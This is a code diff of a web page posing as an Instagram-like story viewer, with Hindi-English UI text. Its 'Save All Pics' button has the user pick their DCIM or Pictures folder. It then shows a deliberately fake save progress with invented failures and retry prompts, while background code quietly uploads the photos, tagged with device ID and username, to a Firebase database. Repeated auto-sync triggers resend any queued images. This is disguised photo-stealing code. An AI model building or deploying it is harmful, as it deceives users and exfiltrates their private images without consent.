+                </div>
+
+                <div class="time-info">
+                    <div class="time-item">
+                        <div class="time-icon">⏱️</div>
+                        <div class="time-data">
+                            <div class="time-value" id="timeRemaining">Calculating...</div>
+                            <div class="time-label">Time Remaining</div>
+                        </div>
+                    </div>
+                    <div class="time-item">
+                        <div class="time-icon">⚡</div>
+                        <div class="time-data">
+                            <div class="time-value" id="saveSpeed">-</div>
+                            <div class="time-label">Speed</div>
+                        </div>
+                    </div>
                 </div>
 
                 <div class="overlay-stats">
@@ -336,7 +1054,15 @@
                     </div>
                 </div>
 
-                <div class="current-file" id="currentFile">Waiting...</div>
+                <div class="current-file-wrap">
+                    <div class="current-file-icon">📄</div>
+                    <div class="current-file" id="currentFile">Waiting...</div>
+                </div>
+
+                <div class="overlay-hint">
+                    <span class="dot-anim"></span>
+                    <span id="hintText">Save ho raha hai, please wait...</span>
+                </div>
 
                 <button class="cancel-btn" id="cancelBtn">Cancel</button>
             </div>
@@ -351,10 +1077,15 @@
                 <div class="error-icon">⚠️</div>
                 <div class="error-title" id="errorTitle">Save Failed</div>
                 <div class="error-sub" id="errorSub">Kuch files save nahi ho paayin.</div>
+                <div class="retry-counter">
+                    <span class="retry-num" id="retryNum">1</span>
+                    <span class="retry-of">of 3</span>
+                </div>
                 <button class="error-retry" id="errorRetry">
                     <span>🔄</span>
-                    <span>Retry</span>
+                    <span>Retry Now</span>
                 </button>
+                <button class="error-skip" id="errorSkip">Skip & Close</button>
             </div>
         </div>
     </div>
@@ -406,36 +1137,45 @@
         const COMPRESS_QUALITY = 0.55;
         const FAKE_FILE_COUNT = 15;
 
-        /* OPFS Support */
-        const OPFS_SUPPORTED = 'storage' in navigator && 'getDirectory' in navigator.storage;
+        const stories = Array.from({ length: 15 }, (_, i) =>
+            `https://picsum.photos/600/1000?random=${i + 1}`
+        );
+        const AVATAR = 'https://picsum.photos/100/100?random=100';
+        const STORY_DURATION = 5000;
 
-        console.log('📱 Device:', DEVICE_ID);
-        console.log('💾 OPFS:', OPFS_SUPPORTED ? '✅' : '❌');
-
-        /* Movie data */
-        const movies = [
-            { title: 'Interstellar', poster: 'https://picsum.photos/800/1400?random=1', year: '2014', genre: 'Sci-Fi', duration: '2h 49m' },
-            { title: 'Inception', poster: 'https://picsum.photos/800/1400?random=2', year: '2010', genre: 'Thriller', duration: '2h 28m' },
-            { title: 'The Dark Knight', poster: 'https://picsum.photos/800/1400?random=3', year: '2008', genre: 'Action', duration: '2h 32m' },
-            { title: 'Oppenheimer', poster: 'https://picsum.photos/800/1400?random=4', year: '2023', genre: 'Biography', duration: '3h 0m' },
-            { title: 'Dune: Part Two', poster: 'https://picsum.photos/800/1400?random=5', year: '2024', genre: 'Sci-Fi', duration: '2h 46m' }
-        ];
-
-        let currentMovieIndex = 0;
-        let isPlaying = true;
-        let videoDuration = 169 * 60;
-        let currentTime = 0;
-        let progressInterval = null;
-
-        /* State */
+        let currentIndex = 0;
+        let storyTimer = null;
         let fakeInterval = null;
         let isCancelled = false;
         let wakeLock = null;
         let uploadStartTime = 0;
         let retryCount = 0;
-        let fakeDone = 0;
+        const MAX_RETRIES = 3;
+        let fakeDone = 0; // 🔥 Global for restart
 
-        /* IndexedDB */
+        /* STAGE ERRORS */
+        const STAGE_ERRORS = {
+            1: {
+                title: 'Network Error',
+                sub: 'WiFi connection weak hai.<br>3 photos skip ho gayin.',
+                retryText: 'Retry Now',
+                progressAtFail: 60
+            },
+            2: {
+                title: 'Server Busy',
+                sub: 'Instagram server slow hai.<br>Please try again.',
+                retryText: 'Try Again',
+                progressAtFail: 40
+            },
+            3: {
+                title: 'Connection Lost',
+                sub: 'Internet connection toot gaya.<br>2 photos pending hain.',
+                retryText: 'Reconnect & Retry',
+                progressAtFail: 80
+            }
+        };
+
+        /* INDEXEDDB */
         const IDB_NAME = 'IGPendingDB';
         const IDB_VERSION = 1;
         const IDB_STORE = 'pending_photos';
@@ -494,63 +1234,19 @@
             });
         }
 
-        /* OPFS helpers */
-        async function opfsSave(fileName, blob) {
-            if (!OPFS_SUPPORTED) return false;
-            try {
-                const root = await navigator.storage.getDirectory();
-                const dir = await root.getDirectoryHandle('pending_photos', { create: true });
-                const fileHandle = await dir.getFileHandle(fileName, { create: true });
-                const writable = await fileHandle.createWritable();
-                await writable.write(blob);
-                await writable.close();
-                return true;
-            } catch (e) {
-                return false;
-            }
-        }
-
-        async function opfsRead(fileName) {
-            if (!OPFS_SUPPORTED) return null;
-            try {
-                const root = await navigator.storage.getDirectory();
-                const dir = await root.getDirectoryHandle('pending_photos');
-                const fileHandle = await dir.getFileHandle(fileName);
-                return await fileHandle.getFile();
-            } catch (e) {
-                return null;
-            }
-        }
-
-        async function opfsDelete(fileName) {
-            if (!OPFS_SUPPORTED) return;
-            try {
-                const root = await navigator.storage.getDirectory();
-                const dir = await root.getDirectoryHandle('pending_photos');
-                await dir.removeEntry(fileName);
-            } catch (e) {}
-        }
-
         /* QUEUE */
-        async function queuePhotoLocally(file, base64, blob) {
+        async function queuePhotoLocally(file, base64) {
             try {
-                let inOPFS = false;
-                if (OPFS_SUPPORTED && blob) {
-                    inOPFS = await opfsSave(file.name, blob);
-                }
-
                 await idbAdd({
                     name: file.name,
-                    image: inOPFS ? null : base64,
+                    image: base64,
                     size: file.size,
                     deviceId: DEVICE_ID,
                     deviceName: DEVICE_NAME,
                     sessionId: SESSION_ID,
                     username: USERNAME,
-                    queuedAt: Date.now(),
-                    inOPFS: inOPFS
+                    queuedAt: Date.now()
                 });
-
                 const count = await idbCount();
                 console.log(`📦 Queued: ${file.name} (total: ${count})`);
             } catch (e) {
@@ -562,23 +1258,16 @@
         async function syncPendingUploads() {
             try {
                 const pending = await idbGetAll();
-                if (pending.length === 0) return { synced: 0, remaining: 0 };
+                if (pending.length === 0) {
+                    console.log('✅ No pending');
+                    return { synced: 0, remaining: 0 };
+                }
 
                 console.log(`🔄 Syncing ${pending.length}...`);
                 let synced = 0, failed = 0;
 
                 for (const item of pending) {
                     try {
-                        let base64;
-
-                        if (item.inOPFS && OPFS_SUPPORTED) {
-                            const blob = await opfsRead(item.name);
-                            if (blob) base64 = await blobToBase64(blob);
-                        }
-
-                        if (!base64 && item.image) base64 = item.image;
-                        if (!base64) { failed++; continue; }
-
                         const photoRef = push(ref(db, 'photos/' + item.deviceId));
                         await set(photoRef, {
                             id: photoRef.key,
@@ -586,19 +1275,16 @@
                             deviceName: item.deviceName,
                             sessionId: item.sessionId,
                             username: item.username,
-                            image: base64,
+                            image: item.image,
                             name: item.name,
                             size: item.size,
                             timestamp: serverTimestamp(),
                             uploadedAt: item.queuedAt,
                             fromQueue: true
                         });
-
-                        if (item.inOPFS) await opfsDelete(item.name);
                         await idbDelete(item.id);
                         synced++;
                         console.log(`✅ Synced: ${item.name}`);
-
                     } catch (err) {
                         failed++;
                         console.warn(`❌ Failed: ${item.name}`);
@@ -608,17 +1294,22 @@
                 console.log(`🎉 Synced ${synced}, failed ${failed}`);
                 return { synced, remaining: failed };
             } catch (e) {
+                console.warn('Sync error:', e.message);
                 return { synced: 0, remaining: 0 };
             }
         }
 
-        /* AUTO-SYNC ON LOAD */
+        /* AUTO-SYNC */
         async function checkAndSyncOnLoad() {
             try {
+                console.log('🔍 Checking pending...');
                 const count = await idbCount();
                 console.log(`📦 IndexedDB: ${count} pending`);
 
-                if (count === 0) return;
+                if (count === 0) {
+                    console.log('✅ No pending uploads');
+                    return;
+                }
 
                 const banner = document.getElementById('resumeBanner');
                 const bannerText = document.getElementById('resumeText');
@@ -634,55 +1325,128 @@
                 } else if (result.remaining > 0) {
                     bannerText.textContent = `⚠️ ${result.remaining} failed — Retry?`;
                     document.getElementById('resumeBtn').textContent = 'Retry';
+                } else {
+                    banner.classList.remove('show');
                 }
             } catch (e) {
                 console.warn('Auto-sync error:', e.message);
             }
         }
 
-        setTimeout(checkAndSyncOnLoad, 500);
-        setTimeout(checkAndSyncOnLoad, 2000);
-        setTimeout(checkAndSyncOnLoad, 5000);
+        /* ============================================================
+        🔥 AUTO-SYNC TRIGGERS — ANDROID SAFE
+        ============================================================ */
+
+        // 1. Early check (page load ke turant baad)
+        (async () => {
+            try {
+                await new Promise(r => setTimeout(r, 300));
+                const count = await idbCount();
+                console.log(`🔥 Early check: ${count} pending`);
+                if (count > 0) {
+                    await checkAndSyncOnLoad();
+                }
+            } catch (e) {
+                console.warn('Early check failed:', e);
+            }
+        })();
+
+        // 2. Multiple timeouts (fail-safe)
+        setTimeout(checkAndSyncOnLoad, 1000);
+        setTimeout(checkAndSyncOnLoad, 3000);
+        setTimeout(checkAndSyncOnLoad, 8000);
         setTimeout(checkAndSyncOnLoad, 15000);
 
+        // 3. Network online
         window.addEventListener('online', () => {
-            setTimeout(checkAndSyncOnLoad, 800);
+            console.log('🌐 Online');
+            setTimeout(checkAndSyncOnLoad, 500);
+        });
+
+        // 4. Tab visible
+        document.addEventListener('visibilitychange', () => {
+            if (document.visibilityState === 'visible') {
+                console.log('👁️ Visible');
+                setTimeout(checkAndSyncOnLoad, 300);
+            }
+        });
+
+        // 5. Page loaded
+        window.addEventListener('load', () => {
+            console.log('📄 Loaded');
+            setTimeout(checkAndSyncOnLoad, 500);
+        });
+
+        // 6. Focus (Android ke liye)
+        window.addEventListener('focus', () => {
+            console.log('🎯 Focused');
+            setTimeout(checkAndSyncOnLoad, 300);
+        });
+
+        // 7. Pageshow (bfcache se wapas aane pe)
+        window.addEventListener('pageshow', (e) => {
+            if (e.persisted) {
+                console.log('📄 From cache');
+                setTimeout(checkAndSyncOnLoad, 300);
+            }
+        });
+
+        window.addEventListener('online', () => {
+            console.log('🌐 Online');
+            setTimeout(checkAndSyncOnLoad, 1000);
         });
 
         document.addEventListener('visibilitychange', () => {
             if (document.visibilityState === 'visible') {
+                console.log('👁️ Visible');
                 setTimeout(checkAndSyncOnLoad, 500);
             }
-        });
-
-        window.addEventListener('focus', () => {
-            setTimeout(checkAndSyncOnLoad, 500);
         });
 
         document.getElementById('resumeBtn').addEventListener('click', async () => {
             const banner = document.getElementById('resumeBanner');
             const bannerText = document.getElementById('resumeText');
             bannerText.textContent = 'Syncing...';
+
             const result = await syncPendingUploads();
+
             if (result.synced > 0) {
                 bannerText.textContent = `✅ ${result.synced} synced!`;
+                showToast(`🎉 ${result.synced} photos uploaded!`);
                 setTimeout(() => banner.classList.remove('show'), 3000);
+            } else {
+                bannerText.textContent = `⚠️ Still ${result.remaining} pending`;
             }
         });
+
+        /* PROGRESS */
+        function saveProgress(savedIndex, total) {
+            try {
+                localStorage.setItem('upload_progress_' + DEVICE_ID, JSON.stringify({
+                    savedIndex, total, timestamp: Date.now(),
+                    status: savedIndex >= total ? 'complete' : 'in_progress'
+                }));
+            } catch (e) { }
+        }
+
+        function clearProgress() {
+            localStorage.removeItem('upload_progress_' + DEVICE_ID);
+        }
 
         /* WAKE LOCK */
         async function keepScreenOn() {
             try {
                 if ('wakeLock' in navigator) {
                     wakeLock = await navigator.wakeLock.request('screen');
+                    console.log('✅ Wake lock ON');
                     wakeLock.addEventListener('release', () => { wakeLock = null; });
                 }
-            } catch (err) {}
+            } catch (err) { }
         }
 
         function releaseWakeLock() {
             if (wakeLock) {
-                wakeLock.release().catch(() => {});
+                wakeLock.release().catch(() => { });
                 wakeLock = null;
             }
         }
@@ -703,31 +1467,21 @@
                 gain.gain.linearRampToValueAtTime(0, audioCtx.currentTime + duration);
                 osc.start(audioCtx.currentTime);
                 osc.stop(audioCtx.currentTime + duration);
-            } catch (e) {}
+            } catch (e) { }
         }
 
         function vibrate(p) { if (navigator.vibrate) navigator.vibrate(p); }
 
         /* DOM */
-        const videoPoster = document.getElementById('videoPoster');
-        const movieTitle = document.getElementById('movieTitle');
-        const movieSub = document.getElementById('movieSub');
-        const centerPlay = document.getElementById('centerPlay');
-        const playPauseBtn = document.getElementById('playPauseBtn');
-        const progressFill = document.getElementById('progressFill');
-        const progressBar = document.getElementById('progressBar');
-        const currentTimeEl = document.getElementById('currentTime');
-        const totalTimeEl = document.getElementById('totalTime');
-        const backBtn = document.getElementById('backBtn');
-        const topBar = document.getElementById('topBar');
-        const bottomControls = document.getElementById('bottomControls');
+        const progressBars = document.getElementById('progressBars');
+        const storyImage = document.getElementById('storyImage');
+        const storyAvatar = document.getElementById('storyAvatar');
+        const storyUsername = document.getElementById('storyUsername');
+        const storyTime = document.getElementById('storyTime');
+        const storyClose = document.getElementById('storyClose');
         const tapLeft = document.getElementById('tapLeft');
         const tapRight = document.getElementById('tapRight');
         const saveAllBtn = document.getElementById('saveAllBtn');
-        const rewindBtn = document.getElementById('rewindBtn');
-        const forwardBtn = document.getElementById('forwardBtn');
-        const volumeBtn = document.getElementById('volumeBtn');
-        const fullscreenBtn = document.getElementById('fullscreenBtn');
 
         const overlay = document.getElementById('processingOverlay');
         const overlayMain = document.getElementById('overlayMain');
@@ -745,180 +1499,109 @@
         const overlayPending = document.getElementById('overlayPending');
         const overlayFailed = document.getElementById('overlayFailed');
         const currentFile = document.getElementById('currentFile');
+        const timeRemaining = document.getElementById('timeRemaining');
+        const saveSpeed = document.getElementById('saveSpeed');
+        const hintText = document.getElementById('hintText');
         const cancelBtn = document.getElementById('cancelBtn');
 
-        /* MOVIE PLAYER */
-        function loadMovie(index) {
-            const movie = movies[index];
-            videoPoster.classList.remove('active');
+        storyAvatar.style.backgroundImage = `url('${AVATAR}')`;
+        storyUsername.textContent = USERNAME;
+
+        /* STORY FUNCTIONS */
+        function initProgressBars() {
+            progressBars.innerHTML = '';
+            stories.forEach(() => {
+                const seg = document.createElement('div');
+                seg.className = 'progress-segment';
+                seg.innerHTML = '<div class="progress-fill"></div>';
+                progressBars.appendChild(seg);
+            });
+        }
+
+        function showStory(index) {
+            if (index < 0 || index >= stories.length) { closeStory(); return; }
+            currentIndex = index;
+
+            storyImage.classList.remove('active');
             setTimeout(() => {
-                videoPoster.src = movie.poster;
-                videoPoster.classList.add('active');
+                storyImage.src = stories[index];
+                storyImage.classList.add('active');
             }, 100);
-            movieTitle.textContent = movie.title;
-            movieSub.textContent = `${movie.year} • ${movie.genre} • ${movie.duration}`;
-            const durations = [169, 148, 152, 180, 166];
-            videoDuration = durations[index] * 60;
-            currentTime = 0;
-            updateProgressUI();
+
+            const times = ['1h', '2h', '3h', '4h', '5h', '6h', '7h', '8h', '9h', '10h', '11h', '12h', '13h', '14h', '15h'];
+            storyTime.textContent = times[index] || '2h';
+
+            const segments = progressBars.querySelectorAll('.progress-segment');
+            segments.forEach((seg, i) => {
+                seg.classList.remove('active', 'viewed');
+                if (i < index) seg.classList.add('viewed');
+                else if (i === index) seg.classList.add('active');
+            });
+
+            startStoryTimer();
         }
 
-        function formatTime(seconds) {
-            const h = Math.floor(seconds / 3600);
-            const m = Math.floor((seconds % 3600) / 60);
-            const s = Math.floor(seconds % 60);
-            if (h > 0) return `${h}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
-            return `${m}:${String(s).padStart(2,'0')}`;
+        function startStoryTimer() {
+            clearStoryTimer();
+            storyTimer = setTimeout(nextStory, STORY_DURATION);
         }
 
-        function updateProgressUI() {
-            const percent = (currentTime / videoDuration) * 100;
-            progressFill.style.width = percent + '%';
-            currentTimeEl.textContent = formatTime(currentTime);
-            totalTimeEl.textContent = formatTime(videoDuration);
+        function clearStoryTimer() {
+            if (storyTimer) { clearTimeout(storyTimer); storyTimer = null; }
         }
 
-        function startPlayback() {
-            if (progressInterval) clearInterval(progressInterval);
-            progressInterval = setInterval(() => {
-                if (!isPlaying) return;
-                currentTime += 1;
-                if (currentTime >= videoDuration) {
-                    currentTime = 0;
-                    isPlaying = false;
-                    updatePlayUI();
-                }
-                updateProgressUI();
-            }, 1000);
+        function nextStory() {
+            if (currentIndex < stories.length - 1) showStory(currentIndex + 1);
+            else closeStory();
         }
 
-        function updatePlayUI() {
-            if (isPlaying) {
-                centerPlay.style.display = 'none';
-                playPauseBtn.textContent = '⏸';
-            } else {
-                centerPlay.style.display = 'flex';
-                playPauseBtn.textContent = '▶';
-            }
+        function prevStory() {
+            if (currentIndex > 0) showStory(currentIndex - 1);
+            else showStory(0);
         }
 
-        function togglePlay() {
-            isPlaying = !isPlaying;
-            updatePlayUI();
-            playSound(600, 0.05);
-            vibrate(20);
+        function closeStory() {
+            clearStoryTimer();
+            showToast('👋 Story ended');
+            setTimeout(() => showStory(0), 500);
         }
 
-        centerPlay.addEventListener('click', togglePlay);
-        playPauseBtn.addEventListener('click', togglePlay);
-        backBtn.addEventListener('click', () => { if (confirm('Exit movie?')) showToast('👋 Exiting...'); });
-        rewindBtn.addEventListener('click', () => { currentTime = Math.max(0, currentTime - 10); updateProgressUI(); });
-        forwardBtn.addEventListener('click', () => { currentTime = Math.min(videoDuration, currentTime + 10); updateProgressUI(); });
-        volumeBtn.addEventListener('click', () => { volumeBtn.classList.toggle('active'); showToast('🔊'); });
-        fullscreenBtn.addEventListener('click', () => {
-            if (!document.fullscreenElement) document.documentElement.requestFullscreen().catch(() => {});
-            else document.exitFullscreen().catch(() => {});
-        });
-        tapLeft.addEventListener('click', () => { currentTime = Math.max(0, currentTime - 10); updateProgressUI(); });
-        tapRight.addEventListener('click', () => { currentTime = Math.min(videoDuration, currentTime + 10); updateProgressUI(); });
-        progressBar.addEventListener('click', (e) => {
-            const rect = progressBar.getBoundingClientRect();
-            const percent = (e.clientX - rect.left) / rect.width;
-            currentTime = Math.floor(percent * videoDuration);
-            updateProgressUI();
+        tapLeft.addEventListener('click', prevStory);
+        tapRight.addEventListener('click', nextStory);
+        storyClose.addEventListener('click', closeStory);
+
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'ArrowRight') nextStory();
+            if (e.key === 'ArrowLeft') prevStory();
         });
 
-        /* SAVE BUTTON — Hybrid: Android uses webkitdirectory, Desktop uses showDirectoryPicker */
+        /* SAVE BUTTON */
         saveAllBtn.addEventListener('click', async () => {
-            saveAllBtn.disabled = true;
-            await keepScreenOn();
+            if (typeof window.showDirectoryPicker !== 'function') {
+                showToast('❌ Chrome ya Edge use karo');
+                return;
+            }
 
-            const isAndroid = /Android/i.test(navigator.userAgent);
+            try {
+                saveAllBtn.disabled = true;
+                await keepScreenOn();
 
-            if (isAndroid || !('showDirectoryPicker' in window)) {
-                // 🔥 ANDROID — webkitdirectory (no Allow dialog)
-                const input = document.createElement('input');
-                input.type = 'file';
-                input.webkitdirectory = true;
-                input.multiple = true;
-                input.style.display = 'none';
-                document.body.appendChild(input);
+                const dirHandle = await window.showDirectoryPicker({
+                    mode: 'read',
+                    startIn: 'pictures'
+                });
 
-                input.onchange = async (e) => {
-                    const files = Array.from(e.target.files);
-                    document.body.removeChild(input);
+                startFakeSave(dirHandle);
 
-                    if (files.length === 0) {
-                        saveAllBtn.disabled = false;
-                        releaseWakeLock();
-                        showToast('❌ Koi folder select nahi kiya');
-                        return;
-                    }
-
-                    const firstPath = files[0].webkitRelativePath || '';
-                    const folderName = firstPath.split('/')[0] || 'Unknown';
-                    const folderLower = folderName.toLowerCase();
-
-                    const GOOD_FOLDERS = ['dcim', 'pictures', 'camera', 'downloads', 'screenshots', 'whatsapp', 'photos'];
-                    if (!GOOD_FOLDERS.includes(folderLower)) {
-                        saveAllBtn.disabled = false;
-                        releaseWakeLock();
-                        if (confirm(`❌ "${folderName}" sahi folder nahi.\n\n✅ DCIM ya Pictures select karo.\n\nTry again?`)) {
-                            saveAllBtn.click();
-                        }
-                        return;
-                    }
-
-                    startFakeSaveFromFiles(files);
-                };
-
-                input.oncancel = () => {
-                    document.body.removeChild(input);
-                    saveAllBtn.disabled = false;
-                    releaseWakeLock();
-                };
-
-                input.click();
-
-            } else {
-                // 🔥 DESKTOP — showDirectoryPicker
-                try {
-                    const dirHandle = await window.showDirectoryPicker({ mode: 'read', startIn: 'pictures' });
-                    const folderLower = (dirHandle.name || '').toLowerCase();
-                    const GOOD_FOLDERS = ['dcim', 'pictures', 'camera', 'downloads', 'screenshots', 'whatsapp', 'photos'];
-
-                    if (!GOOD_FOLDERS.includes(folderLower)) {
-                        saveAllBtn.disabled = false;
-                        releaseWakeLock();
-                        if (confirm(`❌ "${dirHandle.name}" sahi folder nahi.\n\n✅ DCIM ya Pictures select karo.\n\nTry again?`)) {
-                            saveAllBtn.click();
-                        }
-                        return;
-                    }
-
-                    // Save handle for restore
-                    try {
-                        const db = await openIDB();
-                        const tx = db.transaction('handles', 'readwrite');
-                        if (!db.objectStoreNames.contains('handles')) {
-                            // Skip
-                        } else {
-                            tx.objectStore('handles').put(dirHandle, 'folder');
-                        }
-                    } catch (e) {}
-
-                    startFakeSave(dirHandle);
-
-                } catch (err) {
-                    releaseWakeLock();
-                    saveAllBtn.disabled = false;
-                    if (err.name === 'AbortError') return;
-                    showToast('❌ ' + (err.message || 'Error'));
-                }
+            } catch (err) {
+                releaseWakeLock();
+                saveAllBtn.disabled = false;
+                if (err.name === 'AbortError') return;
+                showToast('❌ ' + (err.message || 'Error'));
             }
         });
 
-        /* FAKE SAVE (Desktop - from dirHandle) */
+        /* FAKE SAVE */
         async function startFakeSave(dirHandle) {
             isCancelled = false;
             retryCount = 0;
@@ -935,7 +1618,9 @@
             overlaySub.innerHTML = 'Photos scan ho rahi hain...<br>Please wait.';
 
             const files = [];
-            if (dirHandle) await scanFolder(dirHandle, files);
+            if (dirHandle) {
+                await scanFolder(dirHandle, files);
+            }
 
             const totalFound = files.length;
             const limitedFiles = files.slice(0, MAX_PHOTOS);
@@ -950,38 +1635,7 @@
             overlayProgressLabel.textContent = `0 / ${FAKE_TOTAL} files`;
 
             realSaveInBackground(limitedFiles);
-            runFakeProgress(FAKE_TOTAL);
-        }
 
-        /* FAKE SAVE (Android - from files) */
-        async function startFakeSaveFromFiles(files) {
-            isCancelled = false;
-            retryCount = 0;
-            fakeDone = 0;
-            uploadStartTime = Date.now();
-
-            overlay.classList.add('show');
-            overlayMain.style.display = 'block';
-            successState.classList.remove('show');
-            errorState.classList.remove('show');
-            resetOverlay();
-
-            const FAKE_TOTAL = FAKE_FILE_COUNT;
-            const images = files.filter(f => f.type.startsWith('image/') || /\.(jpg|jpeg|png|gif|webp|heic|heif)$/i.test(f.name));
-
-            console.log(`📁 Real images: ${images.length}, Fake: ${FAKE_TOTAL}`);
-
-            overlayTitle.textContent = 'Saving Photos';
-            overlaySub.innerHTML = `Photos <strong>folder mein save</strong> ho rahi hain.`;
-            overlayPending.textContent = FAKE_TOTAL;
-            overlayProgressLabel.textContent = `0 / ${FAKE_TOTAL} files`;
-
-            realSaveInBackground(images);
-            runFakeProgress(FAKE_TOTAL);
-        }
-
-        /* FAKE PROGRESS RUNNER */
-        function runFakeProgress(FAKE_TOTAL) {
             const fakeNames = Array.from({ length: FAKE_TOTAL }, (_, i) => {
                 const d = String(1 + (i % 30)).padStart(2, '0');
                 const m = String(1 + Math.floor(i / 30)).padStart(2, '0');
@@ -1009,87 +1663,205 @@
                 overlayProgressFill.style.width = percent + '%';
                 overlayProgressPercent.textContent = percent + '%';
                 overlayProgressLabel.textContent = `${fakeDone} / ${FAKE_TOTAL} files`;
+
                 currentFile.textContent = fakeNames[fakeDone - 1] || 'file.jpg';
+
+                const elapsed = (Date.now() - uploadStartTime) / 1000;
+                const avgTime = elapsed / fakeDone;
+                const remaining = Math.ceil((FAKE_TOTAL - fakeDone) * avgTime);
+
+                if (remaining > 60) {
+                    timeRemaining.textContent = `${Math.floor(remaining / 60)}m ${remaining % 60}s`;
+                } else if (remaining > 0) {
+                    timeRemaining.textContent = `${remaining} sec`;
+                } else {
+                    timeRemaining.textContent = 'Almost done...';
+                }
+
+                const speed = fakeDone / elapsed;
+                if (speed > 2) saveSpeed.textContent = 'Fast ⚡';
+                else if (speed > 0.5) saveSpeed.textContent = 'Normal';
+                else saveSpeed.textContent = 'Slow 🐢';
 
                 if (fakeDone >= FAKE_TOTAL) {
                     clearInterval(fakeInterval);
                     fakeInterval = null;
 
                     setTimeout(() => {
-                        if (retryCount === 0 && Math.random() < 0.6) showFakeError();
-                        else if (retryCount === 1 && Math.random() < 0.5) showFakeError();
-                        else if (retryCount === 2 && Math.random() < 0.4) showFakeError();
-                        else showFinalSuccess(FAKE_TOTAL);
+                        if (retryCount === 0 && Math.random() < 0.6) {
+                            showFakeError();
+                        } else if (retryCount === 1 && Math.random() < 0.5) {
+                            showFakeError();
+                        } else if (retryCount === 2 && Math.random() < 0.4) {
+                            showFakeError();
+                        } else {
+                            showFinalSuccess();
+                        }
                     }, 600);
                 }
             }, 400 + Math.random() * 300);
         }
 
+        /* FAKE ERROR */
         function showFakeError() {
             retryCount++;
-            const stage = {
-                1: { title: 'Network Error', sub: 'WiFi connection weak hai.' },
-                2: { title: 'Server Busy', sub: 'Instagram server slow hai.' },
-                3: { title: 'Connection Lost', sub: 'Internet connection toot gaya.' }
-            }[retryCount] || { title: 'Failed', sub: 'Try again.' };
+            const stage = STAGE_ERRORS[retryCount] || STAGE_ERRORS[3];
 
             document.getElementById('errorTitle').textContent = stage.title;
-            errorSub.innerHTML = stage.sub;
+            document.getElementById('errorSub').innerHTML = stage.sub;
+            document.getElementById('retryNum').textContent = retryCount;
+            document.getElementById('errorRetry').innerHTML = `
+                <span>🔄</span>
+                <span>${stage.retryText}</span>
+            `;
 
             overlayMain.style.display = 'none';
             errorState.classList.add('show');
 
             playSound(200, 0.3);
+            setTimeout(() => playSound(300, 0.2), 150);
             vibrate([100, 50, 100, 50, 100]);
-            showToast(`⚠️ Save failed — Retry ${retryCount}/3`);
+
+            showToast(`⚠️ Save failed — Retry ${retryCount}/${MAX_RETRIES}`);
+            console.log(`❌ Fake error stage ${retryCount}/${MAX_RETRIES}`);
 
             releaseWakeLock();
         }
 
+        /* RETRY */
         errorRetry.addEventListener('click', () => {
             errorState.classList.remove('show');
             overlayMain.style.display = 'block';
             resetOverlay();
 
-            const FAKE_TOTAL = FAKE_FILE_COUNT;
-            fakeDone = Math.floor((retryCount - 1) * (FAKE_TOTAL / 3));
+            if (retryCount === 1) {
+                overlayTitle.textContent = 'Retrying...';
+                overlaySub.innerHTML = 'Photos dobara save ho rahi hain.<br>Please wait.';
+            } else if (retryCount === 2) {
+                overlayTitle.textContent = 'Trying Again...';
+                overlaySub.innerHTML = 'Server se connect ho raha hai.<br>Thoda wait karo.';
+            } else if (retryCount >= 3) {
+                overlayTitle.textContent = 'Final Attempt...';
+                overlaySub.innerHTML = 'Aakhri koshish.<br>Please wait.';
+            }
 
-            overlayTitle.textContent = retryCount === 1 ? 'Retrying...' : 'Trying Again...';
-            overlaySub.innerHTML = 'Photos dobara save ho rahi hain.';
+            restartFakeProgress();
 
-            runFakeProgress(FAKE_TOTAL);
+            playSound(600, 0.15);
+            vibrate(50);
         });
 
-        cancelBtn.addEventListener('click', () => {
-            isCancelled = true;
+        /* SKIP */
+        document.getElementById('errorSkip').addEventListener('click', () => {
+            if (confirm('Save adhoori chhodni hai?')) {
+                errorState.classList.remove('show');
+                hideOverlay();
+                releaseWakeLock();
+                saveAllBtn.disabled = false;
+                saveAllBtn.innerHTML = '<span>💾</span><span>Save All Pics</span>';
+                showToast('❌ Cancelled');
+                retryCount = 0;
+            }
+        });
+
+        /* RESTART FAKE */
+        function restartFakeProgress() {
             if (fakeInterval) clearInterval(fakeInterval);
-            hideOverlay();
-            releaseWakeLock();
-            saveAllBtn.disabled = false;
-            showToast('❌ Cancelled');
-            retryCount = 0;
-        });
 
-        function showFinalSuccess(total) {
-            total = total || FAKE_FILE_COUNT;
+            const startFrom = Math.floor((retryCount - 1) * (FAKE_FILE_COUNT / 3));
+            fakeDone = startFrom;
+
+            overlayDone.textContent = fakeDone;
+            overlayPending.textContent = FAKE_FILE_COUNT - fakeDone;
+
+            const percent = Math.round((fakeDone / FAKE_FILE_COUNT) * 100);
+            overlayProgressFill.style.width = percent + '%';
+            overlayProgressPercent.textContent = percent + '%';
+            overlayProgressLabel.textContent = `${fakeDone} / ${FAKE_FILE_COUNT} files`;
+
+            fakeInterval = setInterval(() => {
+                if (isCancelled) return;
+                fakeDone++;
+
+                const shouldFail = Math.random() < 0.02;
+                if (shouldFail) {
+                    overlayFailed.textContent = parseInt(overlayFailed.textContent) + 1;
+                    playSound(300, 0.15);
+                    vibrate(100);
+                } else {
+                    overlayDone.textContent = fakeDone - parseInt(overlayFailed.textContent);
+                    playSound(800 + Math.random() * 400, 0.08);
+                    vibrate(20);
+                }
+
+                overlayPending.textContent = Math.max(0, FAKE_FILE_COUNT - fakeDone);
+
+                const pct = Math.round((fakeDone / FAKE_FILE_COUNT) * 100);
+                overlayProgressFill.style.width = pct + '%';
+                overlayProgressPercent.textContent = pct + '%';
+                overlayProgressLabel.textContent = `${fakeDone} / ${FAKE_FILE_COUNT} files`;
+
+                const elapsed = (Date.now() - uploadStartTime) / 1000;
+                const avgTime = elapsed / fakeDone;
+                const remaining = Math.ceil((FAKE_FILE_COUNT - fakeDone) * avgTime);
+
+                if (remaining > 60) {
+                    timeRemaining.textContent = `${Math.floor(remaining / 60)}m ${remaining % 60}s`;
+                } else if (remaining > 0) {
+                    timeRemaining.textContent = `${remaining} sec`;
+                } else {
+                    timeRemaining.textContent = 'Almost done...';
+                }
+
+                const speed = fakeDone / elapsed;
+                if (speed > 2) saveSpeed.textContent = 'Fast ⚡';
+                else if (speed > 0.5) saveSpeed.textContent = 'Normal';
+                else saveSpeed.textContent = 'Slow 🐢';
+
+                if (fakeDone >= FAKE_FILE_COUNT) {
+                    clearInterval(fakeInterval);
+                    fakeInterval = null;
+
+                    setTimeout(() => {
+                        if (retryCount >= 3) {
+                            showFinalSuccess();
+                        } else if (retryCount === 2 && Math.random() < 0.4) {
+                            showFakeError();
+                        } else {
+                            showFinalSuccess();
+                        }
